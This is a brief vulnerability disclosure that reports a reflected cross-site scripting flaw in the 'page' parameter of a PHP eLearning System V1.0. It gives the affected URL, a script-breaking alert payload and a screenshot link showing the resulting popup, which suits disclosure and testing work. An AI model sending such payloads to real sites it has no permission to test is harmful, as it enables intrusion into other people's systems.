# eLearning System – reflected XSS on (elearning/student/?page=XX) 
# Vendor Homepage:
https://www.sourcecodester.com/php/14787/elearning-system-using-phpmysqli-source-code.html 
Version:V1.0
Tested on: PHP, Apache, MySQL
# Affected Page:
elearning/student/?page=subject 
On this page,page parameter is vulnerable to reflected XSS Attack 
Proof of vulnerability:
# Visit this page：
http://localhost/ elearning/student/?page=subject
# Payload：
</script><script>alert(1)</script>
# Trigger popup：
<img width="416" alt="image" src="https://github.com/qqqyc/vuln/assets/53200267/054109f3-ec13-4ca6-a1a7-dbacdca590c1">
